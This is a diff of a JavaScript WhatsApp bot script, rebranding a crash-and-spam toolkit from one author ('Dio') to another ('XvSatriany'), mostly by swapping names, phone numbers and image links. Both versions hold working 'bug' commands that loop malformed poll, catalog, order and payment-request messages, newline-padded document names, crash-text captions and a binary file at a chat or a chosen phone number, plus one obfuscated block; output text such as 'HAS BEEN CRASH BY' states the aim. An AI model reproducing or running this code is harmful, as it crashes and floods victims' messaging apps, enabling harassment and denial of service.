@@ -8,7 +8,7 @@
 › Base Ori Dio
 › Copyan Base Dio
 
-🌷 KALAU MAU RENAME TARO CREDITS GUA : DIO MODS WA */
+🗿 KALAU MAU RENAME TARO CREDITS GUA : DIO MODS WA */
 
 //=================================================//
 require('./hwkal')
@@ -135,7 +135,7 @@ const deploy = (teks) => {
   haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})}
 //=================================================//
 const reply = (teks) => {
-return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/channel/UCecZsPalX_hpYdqVoRFsHuA`}}}, { quoted: m })} 
+return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://www.youtube.com/channel/UC29cQ2pULR6ECAlAQIPUlfg`}}}, { quoted: m })} 
 //=================================================//
 try {
 let isNumber = x => typeof x === 'number' && !isNaN(x)
@@ -287,10 +287,10 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
-let teks = `══✪〘 *BANG INI BUG ? ☺️* 〙✪══
- ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
+let teks = `══✪〘 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 〙✪══
+ ➲ *Pesan : ${q ? q : 'HAS BEEN CRASH BY 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦'}*\n\n`
 for (let mem of participants) {
 teks += `⭔ @${mem.id.split('@')[0]}\n`
 }
@@ -303,33 +303,33 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
 var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "pollCreationMessage": {
-"name": "HALO 👋 SAYA BOT 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎",
+"name": "𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦",
 "options": [
 {
-"optionName": "KATANYA WA KEBAL"
+"optionName": "𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦"
 },
 {
-"optionName": "BERANI VOTE GA"
+"optionName": "𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦"
 },
 {
-"optionName": "VOTE LAH SEMUA"
+"optionName": "𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦"
 },
 {
-"optionName": "KATANYA KEBAL"
+"optionName": "𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦"
 },
 {
-"optionName": "SALAM BROTHER BY 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎"
+"optionName": "𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦"
 }
 ],
 "selectableOptionsCount": 5
 }
 }), { userJid: m.chat, quoted: doc })
 haikal.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
-deploy('sukses sendbug')}
+deploy('Done Stah')}
 }
 break
 //=================================================//
@@ -339,9 +339,9 @@ if (isBan) throw sticBanLu(from)
 if (!quoted) throw 'Reply Image/sticker'
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku Dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
-function _0x348d(_0x50ce67,_0x2397a1){var _0x15bb19=_0x15bb();return _0x348d=function(_0x348dc9,_0x408474){_0x348dc9=_0x348dc9-0x173;var _0x50d082=_0x15bb19[_0x348dc9];return _0x50d082;},_0x348d(_0x50ce67,_0x2397a1);}var _0x7bda59=_0x348d;(function(_0x2b7a6b,_0x258fac){var _0x3a2d72=_0x348d,_0x26e08e=_0x2b7a6b();while(!![]){try{var _0x574dc3=-parseInt(_0x3a2d72(0x179))/0x1+-parseInt(_0x3a2d72(0x183))/0x2+-parseInt(_0x3a2d72(0x176))/0x3+parseInt(_0x3a2d72(0x17e))/0x4+-parseInt(_0x3a2d72(0x182))/0x5+parseInt(_0x3a2d72(0x180))/0x6+-parseInt(_0x3a2d72(0x173))/0x7;if(_0x574dc3===_0x258fac)break;else _0x26e08e['push'](_0x26e08e['shift']());}catch(_0x36dddf){_0x26e08e['push'](_0x26e08e['shift']());}}}(_0x15bb,0xac052));let media=await quoted[_0x7bda59(0x17d)](quoted);function _0x15bb(){var _0x1beac5=['586320XahqHr','chat','waUploadToServer','key','download','5612456xbkxWC','message','6419334pqEaRs','HW\x20MODS\x20WA\x20','1899640aXNWfS','473494FRUydx','3030587FfNbLm','Message','wa.me/6281214281312','397419wzTxRp','6281214281312@s.whatsapp.net','fromObject'];_0x15bb=function(){return _0x1beac5;};return _0x15bb();}var messa=await prepareWAMessageMedia({'image':media},{'upload':haikal[_0x7bda59(0x17b)]}),catalog=generateWAMessageFromContent(m['chat'],proto[_0x7bda59(0x174)][_0x7bda59(0x178)]({'productMessage':{'product':{'productImage':messa['imageMessage'],'productId':'','jpegThumbnail':kalimage,'title':text+'\x20'+buttonkal,'description':text+'\x20'+buttonkal,'productImageCount':0x3b9ac9ff,'firstImageId':0x1,'retailerId':_0x7bda59(0x181)+bugsw,'bodyText':''+text,'footerText':''+text,'url':_0x7bda59(0x175)},'businessOwnerJid':_0x7bda59(0x177),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m[_0x7bda59(0x17a)],'quoted':doc});haikal['relayMessage'](m[_0x7bda59(0x17a)],catalog[_0x7bda59(0x17f)],{'messageId':catalog[_0x7bda59(0x17c)]['id']});
+function _0x348d(_0x50ce67,_0x2397a1){var _0x15bb19=_0x15bb();return _0x348d=function(_0x348dc9,_0x408474){_0x348dc9=_0x348dc9-0x173;var _0x50d082=_0x15bb19[_0x348dc9];return _0x50d082;},_0x348d(_0x50ce67,_0x2397a1);}var _0x7bda59=_0x348d;(function(_0x2b7a6b,_0x258fac){var _0x3a2d72=_0x348d,_0x26e08e=_0x2b7a6b();while(!![]){try{var _0x574dc3=-parseInt(_0x3a2d72(0x179))/0x1+-parseInt(_0x3a2d72(0x183))/0x2+-parseInt(_0x3a2d72(0x176))/0x3+parseInt(_0x3a2d72(0x17e))/0x4+-parseInt(_0x3a2d72(0x182))/0x5+parseInt(_0x3a2d72(0x180))/0x6+-parseInt(_0x3a2d72(0x173))/0x7;if(_0x574dc3===_0x258fac)break;else _0x26e08e['push'](_0x26e08e['shift']());}catch(_0x36dddf){_0x26e08e['push'](_0x26e08e['shift']());}}}(_0x15bb,0xac052));let media=await quoted[_0x7bda59(0x17d)](quoted);function _0x15bb(){var _0x1beac5=['586320XahqHr','chat','waUploadToServer','key','download','5612456xbkxWC','message','6419334pqEaRs','HW\x20MODS\x20WA\x20','1899640aXNWfS','473494FRUydx','3030587FfNbLm','Message','wa.me/17077706888','397419wzTxRp','17077706888@s.whatsapp.net','fromObject'];_0x15bb=function(){return _0x1beac5;};return _0x15bb();}var messa=await prepareWAMessageMedia({'image':media},{'upload':haikal[_0x7bda59(0x17b)]}),catalog=generateWAMessageFromContent(m['chat'],proto[_0x7bda59(0x174)][_0x7bda59(0x178)]({'productMessage':{'product':{'productImage':messa['imageMessage'],'productId':'','jpegThumbnail':kalimage,'title':text+'\x20'+buttonkal,'description':text+'\x20'+buttonkal,'productImageCount':0x3b9ac9ff,'firstImageId':0x1,'retailerId':_0x7bda59(0x181)+bugsw,'bodyText':''+text,'footerText':''+text,'url':_0x7bda59(0x175)},'businessOwnerJid':_0x7bda59(0x177),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}}),{'userJid':m[_0x7bda59(0x17a)],'quoted':doc});haikal['relayMessage'](m[_0x7bda59(0x17a)],catalog[_0x7bda59(0x17f)],{'messageId':catalog[_0x7bda59(0x17c)]['id']});
 }
 }
 break
@@ -361,9 +361,9 @@ var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "itemCount": 1999,
 "status": "INQUIRY",
 "surface": "CATALOG",
-"message": " BY 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎ ",
+"message": " BY 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 ",
 "orderTitle": " BUG TROLI ", // 
-"sellerJid": "6282264181831@s.whatsapp.net",
+"sellerJid": "17077706888@s.whatsapp.net",
 "token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
 }
 }), { userJid: m.chat, quoted: doc })
@@ -372,7 +372,7 @@ haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
 }
 break
 //=================================================//
-case 'diosantet': {
+case 'satrianysantet': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n`)
@@ -386,7 +386,7 @@ var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.from
 "currencyCodeIso4217": "IDR",
 "amount1000": "100",
 "extendedTextMessage": {
-"text": `MY DEVELOPER 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,
+"text": `MY DEVELOPER 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,
 }
 }}), { userJid: m.chat, quoted: doc})
 haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -409,7 +409,7 @@ var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.from
 "currencyCodeIso4217": "IDR",
 "amount1000": "100",
 "extendedTextMessage": {
-"text": `MY DEVELOPER 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎`,
+"text": `MY DEVELOPER 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`,
 }
 }}), { userJid: m.chat, quoted: doc})
 haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -423,7 +423,7 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
 yy = fs.readFileSync('./baseikal/sound/hwmods.HW')
 haikal.sendMessage(m.chat, {document: yy, mimetype: 'application/octet-stream', fileName:`Diocrash ${buttonkal}.wasking` }, {quoted:doc})
@@ -436,10 +436,10 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
  ilih = fs.readFileSync('./baseikal/sound/hwmods.HW')
- haikal.sendMessage(m.chat, {document: ilih, mimetype: '', fileName:`寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎ ${buttonkal}.wasking` }, {quoted:doc})
+ haikal.sendMessage(m.chat, {document: ilih, mimetype: '', fileName:`𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 ${buttonkal}.wasking` }, {quoted:doc})
  }
  }
  break
@@ -449,7 +449,7 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
 var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "documentMessage": {
@@ -459,7 +459,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
 "pageCount": 0,
 "mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
-"fileName": `🔥 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
+"fileName": `🔥 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
 "fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
 "directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
 "mediaKeyTimestamp": "1658703206",
@@ -475,7 +475,7 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
-ydd = `Hallo Aku dio`
+ydd = `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦`
 for (let i = 0; i < jumlah; i++) {
 var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "documentMessage": {
@@ -485,7 +485,7 @@ var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
 "pageCount": 0,
 "mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
-"fileName": `🔥 寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
+"fileName": `🔥 𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
 "fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
 "directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
 "mediaKeyTimestamp": "1659416157",
@@ -496,103 +496,103 @@ haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
 }
 break
 //=================================================//
-case 'diovirtext1': {
+case 'bangsatvirtext1': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg' }, caption: `寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎ ${iphone}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg' }, caption: `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 ${iphone}` }, { quoted: doc })
 }
 }
 break
-case 'diovirtext2': {
+case 'bangsatvirtext2': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg' }, caption: `寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎ ${iphone1}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg' }, caption: `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 ${iphone1}` }, { quoted: doc })
 }
 }
 break
-case 'diovirtext3': {
+case 'bangsatvirtext3': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg' }, caption: `寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎ ${iphone2}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg' }, caption: `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 ${iphone2}` }, { quoted: doc })
 }
 }
 break
-case 'diovirtext4': {
+case 'bangsatvirtext4': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg' }, caption: `寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎ ${iphone3}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg' }, caption: `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 ${iphone3}` }, { quoted: doc })
 }
 }
 break
-case 'diovirtext5': {
+case 'bangsatvirtext5': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg' }, caption: `寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎ ${iphone4}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg' }, caption: `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 ${iphone4}` }, { quoted: doc })
 }
 }
 break
-case 'diovirtext6': {
+case 'bangsatvirtext6': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
-haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/5583d5c15c9507ebbc220.jpg' }, caption: `寒 𝐃𝐢𝐨 𝐖𝐚𝐬 𝐊𝐢𝐧𝐠 ⚡︎ ⚡︎ ${iphone5}` }, { quoted: doc })
+haikal.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/b0f27c23b7ed1070958cf.jpg' }, caption: `𝑋𝑣𝑆𝑎𝑡𝑟𝑖𝑎𝑛𝑦 ${iphone5}` }, { quoted: doc })
 }
 }
 break
-case 'diovirtext7': {
+case 'bangsatvirtext7': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
